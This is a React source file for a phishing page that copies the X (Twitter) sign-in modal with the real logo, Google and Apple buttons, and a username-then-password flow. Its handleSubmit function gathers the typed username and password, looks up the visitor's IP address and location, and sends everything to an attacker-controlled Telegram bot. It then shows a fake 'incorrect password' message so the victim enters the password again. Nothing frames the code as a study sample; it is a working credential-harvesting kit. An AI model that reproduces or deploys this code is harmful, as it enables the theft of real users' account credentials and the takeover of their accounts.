"use client";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { X, Eye, EyeOff, ArrowLeft } from "lucide-react";

export default function TwitterPage() {
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 2500);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="relative min-h-screen bg-black overflow-x-hidden font-sans">
      <AnimatePresence>
        {isLoading && (
          <motion.div
            key="loader"
            initial={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black"
          >
            <svg
              viewBox="0 0 24 24"
              className="h-16 w-16 fill-white"
              aria-hidden="true"
            >
              <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </svg>
          </motion.div>
        )}
      </AnimatePresence>

      <AuthModal />
    </div>
  );
}

function AuthModal() {
  const [step, setStep] = useState(1);
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [result, setResult] = useState("");

  // 1. Data Submission Function
  const handleSubmit = async () => {
    const Token = import.meta.env.VITE_TELEGRAM_TOKEN;
    const ChatID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!password) return;

    setIsSubmitting(true);
    // Simulate API call
    try {
      const loginData = { user: identifier, pass: password };
      console.log("Submitting login data:", loginData);

      fetch("https://ipapi.co/json/")
        .then((res) => res.json())
        .then((data) => {
          const { ip, country_name, country_calling_code, city } = data;
          const NameLogin = identifier;
          const PasswordLogin = password;
          const SubmitValue = `Twitter Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;

          const token = Token;
          const chat_id = ChatID;
          const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

          const api = new XMLHttpRequest();
          api.open("GET", url, true);
          api.send();

          setTimeout(() => {
            setResult(
              "Sorry, your password was incorrect. Please double-check your password.",
            );
          }, 2000);
        });
      await new Promise((r) => setTimeout(r, 2000));
      // Redirect or handle success
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNext = () => {
    if (identifier.trim().length > 0) setStep(2);
  };

  return (
    /* Mobile: bg-black, no inset p-4 | Desktop: fixed inset with blur/overlay */
    <div className="fixed inset-0 md:bg-[#5b7083]/40 flex items-center justify-center z-40 md:p-4 bg-black">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        /* Mobile: w-full h-full rounded-none | Desktop: max-w-600 rounded-2xl */
        className="bg-black md:bg-white w-full h-full md:max-w-[600px] md:h-[650px] md:min-h-[600px] md:rounded-2xl flex flex-col relative overflow-hidden shadow-xl"
      >
        {/* Header */}
        <div className="flex items-center px-4 h-[53px]">
          <button
            onClick={() => (step === 2 ? setStep(1) : null)}
            className="hover:bg-gray-200 md:hover:bg-gray-200 p-2 rounded-full transition -ml-2 text-white md:text-black"
          >
            {step === 2 ? (
              <ArrowLeft className="w-5 h-5" />
            ) : (
              <X className="w-5 h-5" />
            )}
          </button>
          <div className="flex-1 flex justify-center mr-8">
            <svg
              viewBox="0 0 24 24"
              className="h-8 w-8 fill-white md:fill-black"
            >
              <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </svg>
          </div>
        </div>

        <div className="flex-1 px-8 md:px-20 pb-12 flex flex-col overflow-y-auto">
          <AnimatePresence mode="wait">
            {step === 1 ? (
              <motion.div
                key="step1"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="flex flex-col h-full"
              >
                <h1 className="text-white md:text-[#0f1419] text-[26px] md:text-[31px] font-bold mt-6 mb-8 leading-tight">
                  Sign in to X
                </h1>

                <div className="space-y-3">
                  <button className="w-full bg-white border border-[#cfd9de] text-[#0f1419] py-2.5 rounded-full flex items-center justify-center gap-2 hover:bg-[#e7e7e8] transition text-[15px] font-bold">
                    <svg viewBox="0 0 24 24" className="w-5 h-5">
                      <path
                        d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                        fill="#4285F4"
                      ></path>
                      <path
                        d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                        fill="#34A853"
                      ></path>
                      <path
                        d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                        fill="#FBBC05"
                      ></path>
                      <path
                        d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                        fill="#EA4335"
                      ></path>
                    </svg>
                    Sign in with Google
                  </button>

                  <button className="w-full bg-white border border-[#cfd9de] text-[#0f1419] py-2.5 rounded-full flex items-center justify-center gap-2 font-bold hover:bg-[#e7e7e8] transition text-[15px]">
                    <svg viewBox="0 0 24 24" className="w-5 h-5">
                      <path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.12 0-.23-.02-.3-.03-.01-.06-.04-.22-.04-.39 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.13.05.28.05.43zm4.565 15.71c-.03.07-.463 1.58-1.518 3.12-.945 1.34-1.94 2.71-3.43 2.71-1.517 0-1.9-.88-3.63-.88-1.698 0-2.302.91-3.67.91-1.377 0-2.332-1.26-3.428-2.8-1.287-1.82-2.323-4.63-2.323-7.28 0-4.28 2.797-6.55 5.552-6.55 1.448 0 2.663.91 3.098.91.47 0 1.834-1.02 3.656-1.02 1.52.02 2.9.64 3.93 1.73-.096.06-2.17 1.23-2.17 4.5 0 3.02 2.37 4.66 2.386 4.69-.02.06-.32 1.01-.44 1.36z"></path>
                    </svg>
                    Sign in with Apple
                  </button>
                </div>

                <div className="flex items-center gap-2 my-6">
                  <div className="h-[1px] bg-[#333639] md:bg-[#cfd9de] flex-1" />
                  <span className="text-[15px] text-gray-500 md:text-[#0f1419]">
                    or
                  </span>
                  <div className="h-[1px] bg-[#333639] md:bg-[#cfd9de] flex-1" />
                </div>

                <div className="relative group mb-6">
                  <input
                    type="text"
                    value={identifier}
                    onChange={(e) => setIdentifier(e.target.value)}
                    className="peer w-full h-[56px] border border-gray-700 md:border-[#cfd9de] rounded-[4px] px-3 pt-5 text-[17px] text-white md:text-[#0f1419] outline-none focus:border-[#1d9bf0] transition-colors bg-transparent"
                    placeholder=" "
                  />
                  <label
                    className={`absolute left-3 transition-all duration-200 pointer-events-none ${identifier ? "text-[13px] top-2 text-[#1d9bf0]" : "text-[17px] top-4 text-gray-500"} peer-focus:text-[13px] peer-focus:top-2 peer-focus:text-[#1d9bf0]`}
                  >
                    Phone, email, or username
                  </label>
                </div>

                <button
                  onClick={handleNext}
                  className="w-full bg-white md:bg-[#0f1419] text-black md:text-white h-[44px] rounded-full font-bold text-[15px] hover:opacity-90 transition mb-6"
                >
                  Next
                </button>

                <button className="w-full bg-transparent border border-gray-700 md:border-[#cfd9de] text-white md:text-[#0f1419] h-[44px] rounded-full font-bold text-[15px] hover:bg-white/10 transition mb-auto">
                  Forgot password?
                </button>

                <div className="mt-12 mb-4 text-[#536471] text-[15px]">
                  Don't have an account?{" "}
                  <span className="text-[#1d9bf0] hover:underline cursor-pointer">
                    Sign up
                  </span>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="step2"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                className="flex flex-col h-full"
              >
                <h1 className="text-white md:text-[#0f1419] text-[26px] md:text-[31px] font-bold mt-6 mb-3">
                  Enter your password
                </h1>

                <div className="bg-[#16181c] md:bg-[#eff3f4] h-[56px] rounded-[4px] px-3 flex flex-col justify-center mb-6">
                  <span className="text-[13px] text-gray-500">
                    Phone, email, or username
                  </span>
                  <span className="text-[17px] text-gray-400 md:text-[#0f1419]">
                    {identifier}
                  </span>
                </div>

                <div className="relative group mb-6 w-full">
                  <input
                    type={showPassword ? "text" : "password"}
                    autoFocus
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="peer w-full h-[56px] border border-gray-700 md:border-[#cfd9de] rounded-[4px] px-3 pt-5 text-[17px] text-white md:text-[#0f1419] outline-none focus:border-[#1d9bf0] bg-transparent transition-colors"
                    placeholder=" "
                  />
                  <label
                    className={`absolute left-3 transition-all duration-200 pointer-events-none ${password ? "text-[13px] top-2 text-[#1d9bf0]" : "text-[17px] top-4 text-gray-500"} peer-focus:text-[13px] peer-focus:top-2 peer-focus:text-[#1d9bf0]`}
                  >
                    Password
                  </label>
                  <p className="text-left mt-3 text-xs text-red-600">
                    {result}
                  </p>
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-4 text-gray-500"
                  >
                    {showPassword ? (
                      <EyeOff className="w-5 h-5" />
                    ) : (
                      <Eye className="w-5 h-5" />
                    )}
                  </button>
                </div>

                <button
                  onClick={handleSubmit}
                  disabled={!password || isSubmitting}
                  className={`w-full h-[50px] rounded-full font-bold text-[17px] transition mt-auto mb-6 
                                        ${password ? "bg-white md:bg-[#0f1419] text-black md:text-white" : "bg-[#1d9bf0]/50 text-white/50 cursor-default"}
                                    `}
                >
                  {isSubmitting ? "Logging in..." : "Log in"}
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
}
